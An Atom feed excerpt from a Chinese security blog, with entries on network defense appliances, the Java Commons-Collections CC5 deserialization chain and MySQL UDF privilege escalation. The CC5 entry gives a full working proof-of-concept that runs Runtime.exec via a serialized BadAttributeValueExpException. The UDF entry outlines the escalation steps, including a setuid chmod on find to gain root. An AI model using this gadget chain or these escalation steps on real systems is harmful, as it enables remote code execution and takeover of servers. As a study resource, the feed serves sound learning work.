    <content type="html"><![CDATA[<h2 id="一、网络安全设备"><a href="#一、网络安全设备" class="headerlink" title="一、网络安全设备"></a>一、网络安全设备</h2><p>网络安全设备是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网 之间的界面上构造的保护屏障，针对不同的应用场景有不同的作用，常见的安全设备有防火墙，态势感知，IDS，IPS，全流量分析，漏洞扫描，蜜罐 ，安全邮件，EDR等等。</p><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><p>首先，绘制了最简易三层<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84&spm=1001.2101.3001.7020">网络拓扑结构</a>(含内外网)。现无任何安全设备，介绍每一类设备，常用功能、<strong>部署方式</strong>，同时绘入现有拓扑中，展示种产品在网络中最常规位置。</p><p><strong>部署方式尤其重要，通常需对网络进行控制设备串行、审计类设备旁挂，串行时设备故障可能产生网络故障；而旁挂设备只影响自身功能</strong></p><p><a href="https://blog.csdn.net/weixin_46444606/article/details/114528599">https://blog.csdn.net/weixin_46444606/article/details/114528599</a></p><h2 id="1-防火墙"><a href="#1-防火墙" class="headerlink" title="1.防火墙"></a>1.防火墙</h2><p>串行设备<br>网络边界间的隔离和对网络中数据交互的控制。在典型的网络环境中的主要作用是防范外部网络（如internet）对内部网络（如内部办公局域网）的非法访问行为和恶意攻击行为等安全威胁，防火墙最基础的功能是策略控制流入流出IP及端口、nat、端口映射。防火墙定义也较为模糊，多带有集成功能，目前，世面上购买的防火墙大多也带有IPS功能或服务（兼顾功能）<br>防火墙的“串行设备”特性让它成为网络边界的<strong>唯一关卡</strong>，通过策略、NAT、端口映射三大基础功能，加上现代集成的IPS等高级能力，实现了“外防入侵、内控风险”的效果。不过，它也不是万能的——就像门卫可能漏掉伪装成快递的黑客，防火墙也需要配合其他设备（如IDS、日志审计）才能更安全</p><h2 id="2-IPS（入侵防御系统）"><a href="#2-IPS（入侵防御系统）" class="headerlink" title="2.IPS（入侵防御系统）"></a>2.IPS（入侵防御系统）</h2><p><strong>串行设备</strong><br>防御网络中的攻击和入侵等行为的网关型安全设备，<strong>在安全功能上是对防火墙的一个补充，</strong> 它能够比防火墙更深入的对数据进行检测和控制，进而提升网络对于入侵攻击等威胁的防范水平。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong></p><p><strong>如何补充防火墙</strong></p><p>防火墙像小区的门卫，只检查“快递单”（IP 地址、端口号），比如：</p><p><strong>门卫的局限</strong>：能拦住没工牌的外人，但如果坏人伪造了工牌（比如通过合法端口发送攻击数据），门卫就放行了</p><p><strong>IPS 的升级</strong>：IPS 会拆开快递包裹检查内容，比如</p><p>发现包裹里藏了刀片（SQL 注入代码）或炸弹（病毒文件），直接拦截</p><p>甚至能识别新型攻击手段，比如伪装成正常文件的勒索软件</p><h2 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a>态势感知</h2><p>态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动， 是安全能力的落地</p><p><strong>态势感知</strong>就像给网络装了一个“智能雷达+预言家”的组合，它能 <strong>实时监控整个网络环境</strong>，把各种零散的信息拼成一张“安全地图”，然后告诉你：“现在哪儿有问题？接下来可能要出什么事？咱们该怎么防？”<br>简单说就是：<strong>看清现状、预测风险、提前动手</strong>，让网络从“被动挨打”变成“主动防</p><p><strong>态势感知 &#x3D; 实时监控 + 智能分析 + 风险预言</strong>。它让网络安全从“头痛医头”变成“治未病”，核心就一句话：<strong>“别等黑客动手，咱先堵死他的路！</strong></p><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>蜜罐这个词，最早是被猎人使用的，对，就是进山打猎的人。猎人把罐子装上 蜂蜜，然后放个陷阱，专门用来捕捉喜欢甜食的熊。后来在网络安全领域里， 人们就把欺骗攻击者的诱饵称为“蜜罐”</p><p><strong>蜜罐</strong>就像网络世界里的 <strong>“钓鱼陷阱”</strong>，专门用来忽悠黑客。它的核心逻辑就是：<strong>假装自己是个“软柿子”，吸引坏人过来捏，然后偷偷记下他们的作案手法</strong>。<br>说白了，蜜罐就是一个 <strong>“假目标”</strong>，故意露出破绽让黑客攻击，实际目的是为了摸清对方的路数，保护真正的系统。</p><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>威胁情报是指在网络安全领域中，通过对恶意活动进行收集、分析和处理，形成有关网络威胁的情报信息，以便及时采取措施保障网络安全。威胁情报主要包括恶意软件、网络攻击、网络犯罪等方面的情报信息。</p><p> 威胁情报可以帮助网络安全人员了解当前的威胁形势，及时发现和识别安全威胁，以便采取相应的应对措施。威胁情报的来源包括自主收集、共享交流等多种形式，其分析和处理过程则需要依靠各种技术手段，如威胁情报分析工具、情报交换平台等。威胁情报的重要性逐渐受到广泛关注，成为网络安全工作中不可或缺的一环</p><p><strong>威胁情报</strong>就像网络世界的 <strong>“敌情报告”</strong>，专门用来帮企业和机构 <strong>提前看清坏人要干啥、怎么干，然后堵死他们的路</strong>。简单来说，就是通过 <strong>收集坏人的作案工具、分析他们的套路、预测他们的目标</strong>，让网络安全从 <strong>“被黑客打完了再哭”</strong> 变成 <strong>“提前把门焊死”</strong></p><p>常见威胁情报平台</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://redqueen.tj-un.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.360.net/</span><br></pre></td></tr></table></figure><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>沙箱是指一种在安全测试和开发过程中使用的虚拟环境，可以模拟真实的操作系统和应用程序环境，以便进行安全测试、恶意软件分析、漏洞挖掘等操作，同时不会对真实环境造成影响。</p><p> 在沙箱中，可以运行不受信任的应用程序和代码，同时监控其行为和影响，以便及时发现和处理安全问题。沙箱通常具有隔离、快照、还原、调试等功能，可以帮助研究人员深入分析恶意代码的行为和特征，发现潜在的漏洞和安全风险。</p><p> 沙箱广泛应用于恶意软件分析、漏洞挖掘、网络安全测试、应用程序开发和测试等领域，可以帮助提高安全性和可靠性，减少安全风险和损失。</p><p><strong>沙箱</strong>就像网络世界的 <strong>“儿童沙盘游戏区”</strong>——在这个隔离的小空间里，程序可以随便“玩”（运行），但无论怎么折腾都 <strong>不会影响到外面的真实世界</strong>。简单来说，它是一个 <strong>安全的隔离环境</strong>，专门用来测试可疑文件、运行未知程序，或者处理敏感数据，既能满足功能需求，又能避免搞砸整个系统</p><h2 id="终端防护（EDR）"><a href="#终端防护（EDR）" class="headerlink" title="终端防护（EDR）"></a>终端防护（EDR）</h2><p>终端检测和响应 (EDR) 是一款软件，旨在自动保护组织的最终用户、终端设备和 IT 资产免受那些突破防病毒软件和其他传统终端安全工具安全防线的网络威胁。 EDR 将从网络上的所有终端（台式机和笔记本电脑、服务器、移动设备、IoT（物联网）设备等） 中连续收集数据。 它将实时分析这些数据以查找已知或疑似网络威胁的证据，并且可以自动作出响应以防止或尽可能减少所识别威胁造成的损失。</p><p>你电脑里有个文件突然开始疯狂删东西，传统杀毒软件可能不认识它，但EDR会立刻发现这文件“行为异常”，直接把它关进小黑屋，然后通知管理员：“抓到一个搞破坏的！”</p><h2 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a>NDR</h2><p><strong>NDR</strong>（网络威胁检测与响应）就像是<strong>网络的“智能监控系统”</strong>，专门盯着你家网络里的“车流”（数据流动），一旦发现可疑车辆（比如黑客攻击、病毒传播），它能立刻报警，甚至自动拦下这些危险分子。<br>NDR就像<strong>全网摄像头+自动警报器</strong>，保护客户数据不被黑客窃取</p><h2 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h2><p><strong>旁挂设备</strong><br><strong>在网络中部署IDS设备可以对整个网络系统进行实时监视</strong>，它抓取网络中指定的数据包，对其分析和统计，并能够展示全面的网络监控报表。对于分析发现的具有威胁的网络数据或者行为产生告警。IDS的使用给网络管理人员提供了非常好的辅助管理工具和运维依据。</p><p>常见厂商设备</p><h3 id="奇安信“天眼（NDR）”"><a href="#奇安信“天眼（NDR）”" class="headerlink" title="奇安信“天眼（NDR）”"></a>奇安信“天眼（<strong>NDR</strong>）”</h3><p>奇安信“天眼”是一款<strong>高级威胁检测与响应系统</strong>，主要用于监测和分析网络中的高级威胁（如APT攻击、勒索软件、木马等），通过流量分析、威胁情报匹配、攻击链还原等技术，实现<strong>全流程威胁感知与处置</strong>。其核心功能包括：</p><p><strong>APT攻击检测</strong>：通过流量镜像采集、文件虚拟执行（沙箱）、威胁情报匹配等技术，精准识别隐蔽性强的定向攻击</p><p><strong>网络流量深度解析</strong>：还原HTTP、SMTP等协议流量，提取网络层到应用层的日志数据，并加密传输至分析平台存储</p><p><strong>威胁情报整合</strong>：结合奇安信自有的海量威胁情报库（如恶意IP、域名、文件哈希值），实时匹配攻击行为</p><p><strong>攻击链可视化与溯源</strong>：基于ATT&amp;CK模型，将告警事件关联成攻击链，展示攻击路径、受感染资产及信息泄露情况，支持全包取证分析（类似Wireshark）</p><p><strong>自动化响应处置</strong>：与防火墙、终端EDR等设备联动，实现告警自动封堵、隔离受感染主机等操作</p><h4 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a><strong>系统组成</strong></h4><p>天眼系统主要由以下模块构成：</p><p><strong>分析平台（硬件）</strong>：存储流量日志和告警数据，提供威胁分析、态势感知大屏展示，支持分布式存储和快速检索</p><p><strong>流量传感器（探针）</strong>：部署在网络镜像口，实时采集并解析流量，还原协议内容，生成日志和告警</p><p><strong>文件威胁鉴定器（沙箱）</strong>：对可疑文件（如邮件附件、下载文件）进行虚拟执行，检测恶意行为</p><p><strong>威胁情报（软件）</strong>：集成恶意样本特征、攻击者TTPs（战术、技术、过程）等数据，支撑威胁匹配</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、网络安全设备&quot;&gt;&lt;a href=&quot;#一、网络安全设备&quot; class=&quot;headerlink&quot; title=&quot;一、网络安全设备&quot;&gt;&lt;/a&gt;一、网络安全设备&lt;/h2&gt;&lt;p&gt;网络安全设备是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网 之间的界面</summary>
      
    
    
    
    <category term="hvv" scheme="https://gu0f3n.github.io/categories/hvv/"/>
    
    
    <category term="hvv" scheme="https://gu0f3n.github.io/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>cc5</title>
    <link href="https://gu0f3n.github.io/2025/03/27/cc5/"/>
    <id>https://gu0f3n.github.io/2025/03/27/cc5/</id>
    <published>2025-03-27T01:36:35.000Z</published>
    <updated>2025-03-27T11:25:01.387Z</updated>
    
    <content type="html"><![CDATA[<p>之前分析过了cc6 cc5只不过和cc6链子入口点不一样</p><p>先总结下cc6</p><h4 id="1-造炸弹：组装恶意代码链条"><a href="#1-造炸弹：组装恶意代码链条" class="headerlink" title="1. 造炸弹：组装恶意代码链条"></a><strong>1. 造炸弹：组装恶意代码链条</strong></h4><p><strong>核心武器</strong>：<code>ChainedTransformer</code>（链条转换器）</p><p>通过反射调用<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，相当于把弹计算器的指令拆成四步：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// 拿到Runtime类  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// 获取getRuntime方法  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// 执行getRuntime()得到实例  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// 调用exec弹计算器  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p><strong>作用</strong>：这四步像流水线一样串联，最终执行命令</p><h3 id="大白话解释CC6链的触发流程"><a href="#大白话解释CC6链的触发流程" class="headerlink" title="大白话解释CC6链的触发流程"></a>大白话解释CC6链的触发流程</h3><p>CC6链就像在<strong>快递包裹里藏了一个全自动炸弹</strong>，当目标服务器拆开包裹（反序列化数据）时，会触发一系列连锁反应，最终执行恶意命令（如弹计算器）。以下是通俗拆解：</p><hr><h4 id="1-造炸弹：组装恶意代码链条-1"><a href="#1-造炸弹：组装恶意代码链条-1" class="headerlink" title="1. 造炸弹：组装恶意代码链条"></a><strong>1. 造炸弹：组装恶意代码链条</strong></h4><p>- </p><p>  核心武器</p><p>  ：</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ChainedTransformer</span><br></pre></td></tr></table></figure><p>  （链条转换器）</p><ul><li><p>通过反射调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>相当于把弹计算器的指令拆成四步：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// 拿到Runtime类  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// 获取getRuntime方法  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// 执行getRuntime()得到实例  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// 调用exec弹计算器  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure></li><li><p><strong>作用</strong>：这四步像流水线一样串联，最终执行命令。</p></li></ul><hr><h4 id="2-伪装炸弹：LazyMap的“懒加载”特性"><a href="#2-伪装炸弹：LazyMap的“懒加载”特性" class="headerlink" title="2. 伪装炸弹：LazyMap的“懒加载”特性"></a><strong>2. 伪装炸弹：LazyMap的“懒加载”特性</strong></h4><p><strong>机关设置</strong>：<code>LazyMap</code>（懒加载地图）</p><ul><li>当调用<code>LazyMap.get(&quot;不存在的key&quot;)</code>时，如果<code>key</code>不存在，就会触发预设的恶意链条（<code>ChainedTransformer</code>）。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);  </span><br></pre></td></tr></table></figure><p><strong>问题</strong>：直接调用<code>get</code>会提前触发炸弹，需后续绕过</p><h4 id="3-设置触发开关：TiedMapEntry的hashCode"><a href="#3-设置触发开关：TiedMapEntry的hashCode" class="headerlink" title="3. 设置触发开关：TiedMapEntry的hashCode"></a><strong>3. 设置触发开关：TiedMapEntry的hashCode</strong></h4><p><strong>关键跳板</strong>：<code>TiedMapEntry</code>（绑定地图的入口）</p><p>把<code>LazyMap</code>和一个假<code>key</code>（如<code>&quot;fakeKey&quot;</code>）绑定到<code>TiedMapEntry</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;fakeKey&quot;</span>);  </span><br></pre></td></tr></table></figure><p><strong>触发逻辑</strong>：</p><ul><li>当调用<code>entry.hashCode()</code>时，内部会执行<code>getValue()</code> → <code>lazyMap.get(&quot;fakeKey&quot;)</code> → 触发炸弹。</li></ul><h4 id="4-绕过提前爆炸：反射修改LazyMap的工厂"><a href="#4-绕过提前爆炸：反射修改LazyMap的工厂" class="headerlink" title="4. 绕过提前爆炸：反射修改LazyMap的工厂"></a><strong>4. 绕过提前爆炸：反射修改LazyMap的工厂</strong></h4><p><strong>坑点</strong>：初始化<code>LazyMap</code>时若直接绑定恶意链条，测试时会提前弹计算器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先用无害的Transformer初始化  </span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line"><span class="comment">// 反射偷偷替换成恶意链条  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap, chain);  </span><br></pre></td></tr></table></figure><p>确保炸弹只在反序列化时引爆</p><h4 id="5-自动引爆：HashMap的反序列化机制"><a href="#5-自动引爆：HashMap的反序列化机制" class="headerlink" title="5. 自动引爆：HashMap的反序列化机制"></a><strong>5. 自动引爆：HashMap的反序列化机制</strong></h4><p><strong>最终机关</strong>：<code>HashMap</code>的<code>readObject</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">map.put(entry, <span class="string">&quot;任意值&quot;</span>);  </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>CC6是利用<code>TiedMapEntry</code>中的<code>hashCode</code>函数；CC5是利用<code>TiedMapEntry</code>中的<code>toString</code>函数;为什么还可以利用<code>toString</code>方法；其实也就是因为<code>toString</code>也调用了调用了<code>getValue</code>方法的原因</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BadAttributeValueExpException</code>这个类的readObject调用<code>valObj.toString()</code>,<code>valObj</code>的值是可控的；尽管<code>BadAttributeValueExpException</code>没有实现 <code>Serializable</code> 接口的情况下,任然可以序列化</p><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">bclass</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bclass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前分析过了cc6 cc5只不过和cc6链子入口点不一样&lt;/p&gt;
&lt;p&gt;先总结下cc6&lt;/p&gt;
&lt;h4 id=&quot;1-造炸弹：组装恶意代码链条&quot;&gt;&lt;a href=&quot;#1-造炸弹：组装恶意代码链条&quot; class=&quot;headerlink&quot; title=&quot;1. 造炸弹：组装恶意代码</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>MYSQL UDF提权</title>
    <link href="https://gu0f3n.github.io/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/"/>
    <id>https://gu0f3n.github.io/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/</id>
    <published>2025-03-26T12:37:26.000Z</published>
    <updated>2025-03-26T13:02:20.996Z</updated>
    
    <content type="html"><![CDATA[<p>udf 全称为’user defined function’，意思是’用户自定义函数’。用户可以对<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库</a>所使用的函数进行一个扩展（windows利用dll文件，linux利用so文件），那么我们就可以利用这个特点，往MySQL里面添加一个可以执行系统命令的函数即可。</p><p>UDF 提权就像 <strong>“利用数据库给自己开后门”</strong>。举个例子：假设你偷偷在公司的打卡机里装了一个小程序，这个小程序本来应该只用来记录考勤，但你把它改成了能直接开老板办公室的门禁卡——这就是 UDF 提权的核心逻辑。</p><p>数据库就像一台手机，UDF 就是用户自己安装的 App。正常 App 用来听歌、聊天，但黑客装的 App 其实是偷密码的间谍软件</p><h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><h4 id="1、常规情况："><a href="#1、常规情况：" class="headerlink" title="1、常规情况："></a>1、常规情况：</h4><p>1.1 mysql配置文件secure_file_priv项设置为空，（如果为NULL或&#x2F;tmp&#x2F;等指定目录，即无法自定义udf文件导出位置，则无法利用）；</p><p>1.2 CREATE权限、FILE权限（root用户默认拥有所有权限）。</p><h4 id="2、特殊情况："><a href="#2、特殊情况：" class="headerlink" title="2、特殊情况："></a>2、特殊情况：</h4><p>2.1 INSERT权限、UPDATE权限、DELETE权限。</p><h4 id="提权步骤（简单版）"><a href="#提权步骤（简单版）" class="headerlink" title="提权步骤（简单版）"></a><strong>提权步骤（简单版）</strong></h4><p><strong>传文件</strong>：把恶意代码（比如 <code>udf.so</code>）传到服务器上，比如通过数据库的“文件写入”功能</p><p><strong>导文件</strong>：用 SQL 命令把文件复制到数据库的“插件目录”</p><p><strong>造函数</strong>：在数据库里创建一个“自定义函数”，绑定这个恶意代码</p><p><strong>执行命令</strong>：调用这个函数执行系统命令（比如 <code>chmod u+s /usr/bin/find</code>），直接拿到 root 权限</p><p>等碰到响应靶机 再去做复现执行 现在先简单了解一下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;udf 全称为’user defined function’，意思是’用户自定义函数’。用户可以对&lt;a href=&quot;https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.</summary>
      
    
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>lW1R3S 1.0.1</title>
    <link href="https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/"/>
    <id>https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/</id>
    <published>2025-03-25T08:24:26.000Z</published>
    <updated>2025-03-26T00:26:12.424Z</updated>
    
